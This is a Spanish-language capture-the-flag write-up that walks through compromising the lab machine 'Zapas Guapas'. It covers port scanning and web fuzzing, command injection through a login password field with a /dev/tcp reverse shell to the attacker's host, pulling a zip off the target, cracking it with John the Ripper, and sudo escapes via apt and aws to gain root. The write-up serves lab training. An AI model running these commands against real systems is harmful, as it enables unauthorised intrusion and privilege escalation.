# Zapas Guapas

Maquinas que vamos a utilizar **Kali Linux y Zapas Guapas** [https://thehackerslabs.com/zapas-guapas/](https://thehackerslabs.com/zapas-guapas/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%2048.png)

```bash
ping -c 1 10.0.3.28
```

![image.png](./imagenes/image%2049.png)

Es una maquina Linux

```bash
nmap -p- -sS -sV -sC --open -min-rate=2000 -n -vvv -Pn 10.0.3.28
```

![image.png](./imagenes/image%2050.png)

`22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)`

`80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.57 ((Debian))`

- Miramos lo que correo en el puerto 80 con el navegador web
    
    ![image.png](./imagenes/image%2051.png)
    

- Hacemos Fuzzing web
    
    ```bash
    gobuster dir -u http://10.0.3.28/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,sh,html,txt
    ```
    
    ![image.png](./imagenes/image%2052.png)
    
- Vamos a probar con `login.html`
    
    ![image.png](./imagenes/image%2053.png)
    
- Miramos el código
    
    `CTRL+U`
    
    ![image.png](./imagenes/image%2054.png)
    
    Hay un comentario curioso. Que indica que se ejecutaran comandos en la casilla contraseña. Lo probamos.
    
    ![image.png](./imagenes/image%2055.png)
    
    ![image.png](./imagenes/image%2056.png)
    
- Probamos a ejecutar una reverse shell . [https://www.revshells.com/](./imagenes/https://www.revshells.com/)
    
    ![image.png](./imagenes/image%2057.png)
    
    `sh -i >& /dev/tcp/10.0.3.4/444 0>&1`
    
    `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
    
    - Nos ponemos a la escucha en el puerto 444 con netcat
        
        ```bash
        nc -nlvp 444 
        ```
        
        ![image.png](./imagenes/image%2058.png)
        
    - Ejecutamos el comando en el formulario de login. `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1”`
        
        ![image.png](./imagenes/image%2059.png)
        
        ![image.png](./imagenes/image%2060.png)
        
        Ya tenemos acceso
        
        - Vamos a empezar el tratamiento de la TTY .
        - Escribimos el siguiente comando  y veremos que adquirimos un prompt.
            
            `script /dev/null -c bash`
            
            ![image.png](./imagenes/image%2061.png)
            
        - Hacemos un **`CTRL+Z`**
            
            ![image.png](./imagenes/image%2062.png)
            
        
        - Escribimos a continuación.
            
            `stty raw -echo; fg`
            
            ![image.png](./imagenes/image%2063.png)
            
        
        - Escribimos `reset xterm` . Es posible que no se muestre cuando lo escribimos pero aun así lo escribimos y pulsamos Enter. Y nos aparecerá la siguiente pantalla.
            
            ![image.png](./imagenes/image%2064.png)
            
        
        - Por ultimo tenemos que exportar 2 variables. escribimos lo siguiente.
            
            `export TERM=xterm`
            
            `export SHELL=bash`
            
            ![image.png](./imagenes/image%2065.png)
            
            **Ya nos aceptaría los comandos que antes no lo hacia**.
            
        - Investigando por la maquina he encontrado en la carpeta **/opt** un archivo **importante.zip.** Lo vamos a llevarlo a nuestra maquina Kali**.**
            
            ![image.png](./imagenes/image%2066.png)
            
            - En la maquina victima creamos un servidor web por el puerto 8080
                
                `python3 -m http.server 8080`
                
                ![image.png](./imagenes/image%2067.png)
                
            
            - En nuestra Kali llamamos al archivo para descargarlo
                
                ```bash
                wget [http://10.0.3.28:8080/importante.zip](./imagenes/http://10.0.3.28:8080/importante.zip)
                ```
                
                ![image.png](./imagenes/image%2068.png)
                
        
        - Intentamos descomprimir el archivo pero esta protegido por contraseña.
            
            ![image.png](./imagenes/image%2069.png)
            
        
        - Hacemos un ataque de fuerza bruta con **John The Ripper** .
            
            ```bash
            zip2john importante.zip > hash
            ```
            
            ![image.png](./imagenes/image%2070.png)
            
            ```bash
            john --wordlist=/usr/share/wordlists/rockyou.txt hash 
            ```
            
            ![image.png](./imagenes/image%2071.png)
            
            **Contraseña del archivo: `hotstuff`**
            
        - Descomprimimos el archivo y miramos el contenido.
            
            ```bash
            unzip importante.zip 
            ```
            
            ```bash
            cat password.txt
            ```
            
            ![image.png](./imagenes/image%2072.png)
            
            **Contraseña de pronike: `pronike11`**
            
        - Nos cambiamos de usuario a **pronike**
            
            `su pronike`
            
            ![image.png](./imagenes/image%2073.png)
            
        
        - Listamos privilegios para ver los permisos **sudo -l**
            
            `sudo -l`
            
            ![image.png](./imagenes/image%2074.png)
            
        - Investigamos en **[https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/)
            
            ![image.png](./imagenes/image%2075.png)
            
        - Usamos la primera opcion: **sudo apt changelog apt,** pero modificándola para la ejecute en nombre del usuario proadidas como indica el listado **sudo -l.**
            
            `sudo -u proadidas apt changelog apt`
            `!/bin/sh`
            
            ![image.png](./imagenes/image%2076.png)
            
            ![image.png](./imagenes/image%2077.png)
            
            ![image.png](./imagenes/image%2078.png)
            
        - Volvemos a Listar privilegios para ver los permisos **sudo -l**
            
            `sudo -l`
            
            ![image.png](./imagenes/image%2079.png)
            
            ![image.png](./imagenes/image%2080.png)
            
        
        - Probamos
            
            `sudo -u root aws help`
            `!/bin/sh`
            
            ![image.png](./imagenes/image%2081.png)
            
            ![image.png](./imagenes/image%2082.png)
            
            `whoami`
            
            ![image.png](./imagenes/image%2083.png)
            
        - Hacemos un TTY basico
            
            `script /dev/null -c bash`
   